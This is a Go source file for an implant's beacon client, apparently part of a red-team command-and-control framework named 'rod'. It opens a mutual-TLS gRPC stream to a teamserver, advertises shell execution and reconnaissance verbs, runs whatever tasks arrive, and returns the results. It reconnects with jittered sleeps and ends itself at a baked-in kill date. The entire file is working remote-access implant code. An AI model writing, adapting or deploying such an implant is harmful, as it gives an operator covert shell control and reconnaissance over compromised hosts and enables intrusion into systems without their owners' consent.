// Package beacon is the reference implant's mTLS check-in client: it opens the
// long-lived reverse Beacon.CheckIn stream, completes the handshake, and then
// loops reading downstream tasking and writing upstream results
// (architecture.md Sec 5/8, Sec 10.3). The stream is bidirectional frames whose
// payloads are the rod.v1 handshake/task/result messages.
package beacon

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"time"

	"github.com/cw/rod/implant/internal/exec"
	"github.com/cw/rod/implant/rodpb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

// Caps are the capability verbs the reference implant advertises at handshake
// (architecture.md Sec 10). The teamserver gates dispatch on these: the core
// shell verb plus the three recon verbs the runner implements.
var Caps = []string{
	"shell.exec",
	"recon.portscan",
	"recon.hostenum",
	"recon.service",
}

// Beacon runs the implant's check-in lifecycle against the teamserver: dial the
// mTLS endpoint, complete the handshake, then loop dispatching downstream tasks
// and reporting upstream results. It blocks until ctx is cancelled, the stream
// ends, or the baked-in kill date passes. The cadence follows the baked-in
// sleep + jitter profile.
type Beacon struct {
	beaconURL string
	leaf      tls.Certificate
	cas       []*x509.Certificate
	implantID string
	sleep     time.Duration
	jitter    time.Duration
	killDate  time.Time
	runner    *exec.Runner
	log       *log.Logger
}

// New builds a Beacon from an enrollment result and the beacon profile. killDate
// is the hard self-termination timestamp baked into the profile
// (architecture.md Sec 7); the zero value disables the mid-run check (the
// implant still refuses to start past it, enforced in main).
func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, killDate time.Time, log *log.Logger) *Beacon {
	return &Beacon{
		beaconURL: beaconURL,
		leaf:      leaf,
		cas:       cas,
		implantID: implantID,
		sleep:     sleep,
		jitter:    jitter,
		killDate:  killDate,
		runner:    exec.NewRunner(log),
		log:       log,
	}
}

// Run blocks until the stream ends, ctx is cancelled, or the kill date passes.
// It reconnects after a jittered sleep when the stream drops (implants are
// connection initiators; flapping is expected and handled by reconnecting,
// architecture.md Sec 8). The kill date is checked at the top of each cycle so a
// long-running implant self-terminates once it passes, not only on the next
// restart (architecture.md Sec 7).
func (b *Beacon) Run(ctx context.Context) error {
	for {
		if !b.killDate.IsZero() && time.Now().After(b.killDate) {
			return fmt.Errorf("kill date %s reached; terminating", b.killDate.Format(time.RFC3339))
		}
		if err := b.runOnce(ctx); err != nil {
			b.log.Printf("beacon stream ended: %v", err)
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if err := b.sleepWithJitter(ctx); err != nil {
			return err
		}
	}
}

// runOnce performs one connect-handshake-task cycle. Returns the stream error
// when it ends (clean close, transport error, or handshake refusal).
func (b *Beacon) runOnce(ctx context.Context) error {
	pool := x509.NewCertPool()
	for _, ca := range b.cas {
		pool.AddCert(ca)
	}
	// The dev teamserver presents the CA certificate itself as its server
	// identity (TransportHost.ConfigureMtlsHttps), and that CA cert carries no
	// Subject Alternative Names -- only CN="Rod Dev CA". Standard TLS name
	// verification would therefore reject it for any dial address. The implant
	// pins the CA explicitly (returned at enroll, or supplied via -ca-cert), so
	// the security property here is chain-to-pinned-CA, not DNS name match --
	// the same shape the C# beacon client uses (AllowUnknownCertificateAuthority
	// + chain build against the dev CA). We disable Go's name check and replace
	// it with a manual chain-to-pool verification in VerifyPeerCertificate.
	creds := credentials.NewTLS(&tls.Config{
		Certificates:          []tls.Certificate{b.leaf},
		RootCAs:               pool,
		InsecureSkipVerify:    true,
		VerifyPeerCertificate: verifyChain(pool),
		MinVersion:            tls.VersionTLS12,
	})

	conn, err := grpc.NewClient(grpcTarget(b.beaconURL), grpc.WithTransportCredentials(creds))
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	client := rodpb.NewBeaconClient(conn)
	stream, err := client.CheckIn(ctx)
	if err != nil {
		return fmt.Errorf("open stream: %w", err)
	}
	defer stream.CloseSend()

	// The implant speaks first: handshake with its protocol version and identity.
	handshake := &rodpb.HandshakeRequest{
		Version:      &rodpb.ProtocolVersion{Major: 1, Minor: 0},
		ImplantId:    b.implantID,
		Capabilities: Caps,
	}
	payload, err := proto.Marshal(handshake)
	if err != nil {
		return fmt.Errorf("marshal handshake: %w", err)
	}
	if err := stream.Send(&rodpb.Frame{Payload: payload}); err != nil {
		return fmt.Errorf("send handshake: %w", err)
	}

	resp, err := stream.Recv()
	if err != nil {
		return fmt.Errorf("recv handshake: %w", err)
	}
	var hs rodpb.HandshakeResponse
	if err := proto.Unmarshal(resp.GetPayload(), &hs); err != nil {
		return fmt.Errorf("parse handshake response: %w", err)
	}
	if hs.GetStatus() != rodpb.HandshakeStatus_HANDSHAKE_STATUS_OK {
		return fmt.Errorf("handshake refused: %s", hs.GetStatus())
	}
	b.log.Printf("handshake ok: engagement=%s", hs.GetEngagementId())

	// Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
	for {
		frame, err := stream.Recv()
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			return fmt.Errorf("recv task: %w", err)
		}
		var task rodpb.TaskRequest
		if err := proto.Unmarshal(frame.GetPayload(), &task); err != nil {
			b.log.Printf("dropping non-task frame: %v", err)
			continue
		}
		outcome, output := b.runner.Dispatch(ctx, task.GetVerb(), task.GetArguments())
		result := &rodpb.TaskResult{
			TaskId:  task.GetTaskId(),
			Outcome: outcome,
			Output:  output,
		}
		resultPayload, err := proto.Marshal(result)
		if err != nil {
			b.log.Printf("marshal result: %v", err)
			continue
		}
		if err := stream.Send(&rodpb.Frame{Payload: resultPayload}); err != nil {
			return fmt.Errorf("send result: %w", err)
		}
	}
}

// sleepWithJitter sleeps for the base interval +/- jitter/2, honoring ctx.
func (b *Beacon) sleepWithJitter(ctx context.Context) error {
	d := b.sleep
	if b.jitter > 0 {
		delta := time.Duration(rand.Int63n(int64(b.jitter))) - b.jitter/2
		d += delta
	}
	if d < 0 {
		d = 0
	}
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-time.After(d):
		return nil
	}
}

// grpcTarget converts a beacon URL (https://host:port or host:port) into the
// host:port target grpc.NewClient expects. grpc.NewClient does not accept a
// scheme in the target: it derives transport security from the credentials, so
// a passed "https://127.0.0.1:5443" is misparsed as "host:port:443". Strip the
// scheme and any trailing path, leaving just the authority.
func grpcTarget(beaconURL string) string {
	u := beaconURL
	if i := indexOf(u, "://"); i >= 0 {
		u = u[i+3:]
	}
	if i := indexOf(u, "/"); i >= 0 {
		u = u[:i]
	}
	return u
}

// verifyChain returns a VerifyPeerCertificate callback that accepts the peer
// certificate iff it chains to one of the pinned CAs in pool. Used with
// InsecureSkipVerify=true (which disables Go's built-in name + chain check) so
// the implant's security model -- pin the teamserver CA, ignore DNS names, which
// the dev CA cert has none of -- is enforced here against the pinned pool.
func verifyChain(pool *x509.CertPool) func([][]byte, [][]*x509.Certificate) error {
	return func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
		if len(rawCerts) == 0 {
			return errors.New("no server certificate presented")
		}
		certs := make([]*x509.Certificate, 0, len(rawCerts))
		for _, raw := range rawCerts {
			cert, err := x509.ParseCertificate(raw)
			if err != nil {
				return fmt.Errorf("parse server certificate: %w", err)
			}
			certs = append(certs, cert)
		}
		// Verify the leaf against the pinned pool. DNS/email/IP names are not
		// checked (the dev CA has none); chain trust is the gate.
		_, err := certs[0].Verify(x509.VerifyOptions{
			Roots:     pool,
			KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		})
		return err
	}
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
